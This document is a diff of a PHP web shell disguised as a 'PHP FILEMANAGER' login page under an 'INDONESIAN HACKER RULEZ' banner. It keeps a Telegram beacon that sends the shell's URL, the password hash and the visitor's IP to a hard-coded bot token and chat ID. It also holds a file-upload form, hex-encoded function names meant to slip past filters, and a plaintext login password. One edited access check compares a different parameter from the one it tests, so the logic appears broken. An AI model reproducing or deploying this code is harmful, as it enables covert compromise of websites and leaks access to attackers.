@@ -1,11 +1,11 @@
 
 <?php
-session_start();
-$hashed_password = '$2y$10$QVpvHdIVCl6XsPh5c1.myO/rKnmpQdjJo6BH0lgemCyY0NJDjvlLu';
+ERROR_REPORTING(0);
+$hashed_password = '$2y$10$Pt658eHI1OlnfyGXAm/VPufTThQKyCjhF/Bj/IEq5OzATN1k5bKWq';
 $botToken = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
 $chatId = '5070938778';
 $xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$logMessage  = "___UBK3___ \n\n Shell nya =\n $xPath \n\n Password =\n $hashed_password \n\n IP Hacker  :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+$logMessage  = "___gektbl___ \n\n Shell nya =\n $xPath \n\n Password =\n $hashed_password \n\n IP Hacker  :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 sendTelegramMessage($botToken, $chatId, $logMessage);
 
 function sendTelegramMessage($botToken, $chatId, $message)
@@ -26,7 +26,7 @@ function sendTelegramMessage($botToken, $chatId, $message)
     $response = file_get_contents($url, false, $context);
 
 }
-if (isset($_GET['UBK']) && $_GET['UBK'] === '3') {
+if (isset($_GET['UBK']) && $_GET['tbl'] === 'tbl') {
     echo '<form method="post" enctype="multipart/form-data">';
     echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
     echo '<input type="file" name="file" size="15">';
@@ -65,7 +65,7 @@ if (!isset($_COOKIE['auth']) || $_COOKIE['auth'] !== 'ok') {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LOGIN</title>
+    <title>GEK - LOGLBT</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Source+Code+Pro:wght@400;600&display=swap');
@@ -418,23 +418,8 @@ if (!isset($_COOKIE['auth']) || $_COOKIE['auth'] !== 'ok') {
         <!-- Header -->
         <div class="login-header">
             <div class="logo">◢ INDONESIAN HACKER RULEZ ◣</div>
-            <div class="subtitle"></> HOST PHP FILEMANAGER </></div>
+            <div class="subtitle"></> PHP FILEMANAGER </></div>
         </div>
-
-        <!-- Terminal Simulation -->
-        <div class="terminal-line">> Initializing secure connection...</div>
-        <div class="terminal-line">> Quantum encryption enabled</div>
-        <div class="terminal-line">> Awaiting filemanager authorization...</div>
-
-        <!-- Login Form -->
-        <form id="loginForm" method="POST" action="">
-            <div class="form-group">
-                <label class="form-label">
-                    <i class="fas fa-user-secret"></i> USERS ID
-                </label>
-                <input type="text" name="user_id" class="form-input" placeholder="Enter your user identifier" required>
-            </div>
-
             <div class="form-group">
                 <label class="form-label">
                     <i class="fas fa-key"></i> Key Code
@@ -459,7 +444,7 @@ if (!isset($_COOKIE['auth']) || $_COOKIE['auth'] !== 'ok') {
             </div>
             <div class="loading" id="loading">
                 <div class="spinner"></div>
-                Establishing filemanager connection...
+                LOG IN WITH PASSWORD : PASSWORDADMIN@123
             </div>
         </div>
     </div>
@@ -566,13 +551,6 @@ if (!isset($_COOKIE['auth']) || $_COOKIE['auth'] !== 'ok') {
     
 <?php
 session_start();
-@set_time_limit(0);
-@clearstatcache();
-@ini_set('error_log', NULL);
-@ini_set('log_errors', 0);
-@ini_set('max_execution_time', 0);
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
 // function WAF
 $Array = [
     "676574637764", # ge  tcw d => 0
